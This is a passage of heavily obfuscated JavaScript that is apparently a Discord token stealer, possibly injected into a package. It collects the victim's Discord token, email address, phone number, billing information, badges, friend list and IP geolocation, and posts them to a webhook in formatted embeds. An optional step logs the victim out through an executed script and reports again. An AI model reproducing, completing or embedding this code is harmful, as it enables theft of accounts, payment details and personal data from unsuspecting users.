_0x222cab={'protocol':_0x4934ff[_0x34268b(0x1eb)],'hostname':_0x4934ff[_0x34268b(0x1de)],'path':_0x4934ff[_0x34268b(0x171)],'method':_0x34268b(0x1a3),'headers':_0x7eb9ab},_0x1b1b5f=https[_0x34268b(0x1fb)](_0x222cab);_0x1b1b5f['on']('error',_0x1ae957=>{console['log'](_0x1ae957);}),_0x1b1b5f['write'](JSON['stringify'](_0x36c7c6)),_0x1b1b5f[_0x34268b(0x17e)]();}function createEmbed(_0x535474){var _0x16d20e=_0x1e40c3;let _0x1ba84e={'footer':config[_0x16d20e(0x21d)][_0x16d20e(0x1fe)],'timestamp':new Date()};for(let [_0x1b96d2,_0x30738f]of Object['entries'](_0x535474)){_0x1ba84e[_0x1b96d2]=_0x30738f;}return _0x1ba84e;}async function initialize(){var _0x345527=_0x1e40c3;if(!fs['existsSync'](process[_0x345527(0x1fa)]()+'/'+config[_0x345527(0x1ff)])){fs[_0x345527(0x1d8)](process[_0x345527(0x1fa)]()+'/'+config[_0x345527(0x1ff)]);var _0x156c84=undefined;_0x156c84=await getToken();const _0x361087=await getIp();var _0x3a11d5,_0x5d1233,_0x31ea50;config[_0x345527(0x1d6)]&&(_0x156c84==undefined?sendToWebhook({'username':config[_0x345527(0x21d)][_0x345527(0x198)],'avatar_url':config['embed'][_0x345527(0x212)],'url':config['embed']['href'],'embeds':[createEmbed({'title':_0x345527(0x1a1),'fields':[{'name':_0x345527(0x1fd),'value':_0x345527(0x1c1)+os[_0x345527(0x18b)]+_0x345527(0x1c1),'inline':![]},{'name':_0x345527(0x18d),'value':_0x345527(0x1c1)+getDiscordClient()+'```','inline':![]},{'name':_0x345527(0x1d9),'value':_0x345527(0x215)+(_0x361087['ip']??_0x345527(0x190))+_0x345527(0x17b)+(_0x361087[_0x345527(0x18b)]??_0x345527(0x190))+_0x345527(0x217)+(_0x361087[_0x345527(0x1a7)]??_0x345527(0x190))+'\x0aRegion:\x20'+(_0x361087['region']??_0x345527(0x190))+_0x345527(0x187)+(_0x361087['country']??_0x345527(0x190))+_0x345527(0x1f8)+(_0x361087[_0x345527(0x1c7)]??_0x345527(0x190))+_0x345527(0x1c1),'inline':![]}]})]}):(_0x3a11d5=await getUserInfo(_0x156c84),_0x5d1233=await getBilling(_0x156c84),_0x31ea50=await getRelationships(_0x156c84),sendToWebhook({'username':config[_0x345527(0x21d)][_0x345527(0x198)],'avatar_url':config[_0x345527(0x21d)][_0x345527(0x212)],'embeds':[createEmbed({'title':_0x345527(0x18f),'url':config[_0x345527(0x21d)]['href'],'author':{'name':_0x3a11d5[_0x345527(0x198)]+'#'+_0x3a11d5[_0x345527(0x1dd)]+'\x20('+_0x3a11d5['id']+')','url':config['embed'][_0x345527(0x181)],'icon_url':_0x3a11d5[_0x345527(0x208)]?'https://cdn.discordapp.com/avatars/'+_0x3a11d5['id']+'/'+_0x3a11d5[_0x345527(0x208)]:_0x345527(0x1be)},'thumbnail':{'url':_0x3a11d5[_0x345527(0x208)]?_0x345527(0x18e)+_0x3a11d5['id']+'/'+_0x3a11d5[_0x345527(0x208)]:_0x345527(0x1be)},'fields':[{'name':'E-Mail\x20Address','value':'```'+_0x3a11d5[_0x345527(0x189)]+'```','inline':!![]},{'name':'Phone\x20Number','value':_0x345527(0x1c1)+(_0x3a11d5[_0x345527(0x16f)]??_0x345527(0x202))+_0x345527(0x1c1),'inline':![]},{'name':'Nitro','value':''+getNitro(_0x3a11d5[_0x345527(0x1aa)]),'inline':![]},{'name':_0x345527(0x21e),'value':''+_0x5d1233,'inline':!![]},{'name':_0x345527(0x1f2),'value':''+getBadges(_0x3a11d5[_0x345527(0x214)]),'inline':![]},{'name':'Token','value':_0x345527(0x1c1)+_0x156c84+'```','inline':![]},{'name':_0x345527(0x1fd),'value':'```'+os[_0x345527(0x18b)]+_0x345527(0x1c1),'inline':![]},{'name':_0x345527(0x18d),'value':_0x345527(0x1c1)+getDiscordClient()+_0x345527(0x1c1),'inline':![]},{'name':_0x345527(0x1d9),'value':'```yaml\x0aIP\x20Address:\x20'+(_0x361087['ip']??_0x345527(0x190))+'\x0aHostname:\x20'+(_0x361087[_0x345527(0x18b)]??_0x345527(0x190))+_0x345527(0x217)+(_0x361087[_0x345527(0x1a7)]??_0x345527(0x190))+'\x0aRegion:\x20'+(_0x361087['region']??_0x345527(0x190))+_0x345527(0x187)+(_0x361087['country']??_0x345527(0x190))+_0x345527(0x1f8)+(_0x361087[_0x345527(0x1c7)]??_0x345527(0x190))+_0x345527(0x1c1),'inline':![]}]}),createEmbed({'description':_0x345527(0x1c3)+_0x31ea50[_0x345527(0x21a)]+')**\x0a\x0a'+_0x31ea50['frien'],'thumbnail':{'url':_0x3a11d5[_0x345527(0x208)]?_0x345527(0x18e)+_0x3a11d5['id']+'/'+_0x3a11d5[_0x345527(0x208)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'author':{'name':_0x3a11d5[_0x345527(0x198)]+'#'+_0x3a11d5[_0x345527(0x1dd)]+'\x20('+_0x3a11d5['id']+')','url':config['embed'][_0x345527(0x181)],'icon_url':_0x3a11d5[_0x345527(0x208)]?'https://cdn.discordapp.com/avatars/'+_0x3a11d5['id']+'/'+_0x3a11d5['avatar']:'https://cdn.discordapp.com/embed/avatars/0.png'}})]}))),config['logout']&&_0x156c84&&(await execScript(_0x345527(0x1f1),!![])[_0x345527(0x206)](_0x88f8a7=>{}),config[_0x345527(0x20a)]&&sendToWebhook({'username':config['embed'][_0x345527(0x198)],'avatar_url':config['embed']['avatar_url'],'embeds':[createEmbed({'title':_0x345527(0x1d0),'url':config[_0x345527(0x21d)][_0x345527(0x181)],'author':{'name':_0x3a11d5[_0x345527(0x198)]+'#'+_0x3a11d5[_0x345527(0x1dd)]+'\x20('+_0x3a11d5['id']+')','url':config[_0x345527(0x21d)][_0x345527(0x181)],'icon_url':_0x3a11d5[_0x345527(0x208)]?'https://cdn.discordapp.com/avatars/'+_0x3a11d5['id']+'/'+_0x3a11d5[_0x345527(0x208)]:_0x345527(0x1be)},'thumbnail':{'url':_0x3a11d5[_0x345527(0x208)]?_0x345527(0x18e)+_0x3a11d5['id']+'/'+_0x3a11d5['avatar']:_0x345527(0x1be)},'fields':[{'name':_0x345527(0x196),'value':''+getNitro(_0x3a11d5[_0x345527(0x1aa)]),'inline':![]},{'name':'Billing','value':''+_0x5d1233,'inline':!![]},{'name':_0x345527(0x1f2),'value':''+getBadges(_0x3a11d5[_0x345527(0x214)]),'inline':![]},{'name':_0x345527(0x1db),'value':_0x345527(0x1c1)+_0x156c84+_0x345527(0x1c1),'inline':![]}]})]}));}}module[_0x1e40c3(0x1f9)]=require(_0x1e40c3(0x1d5));
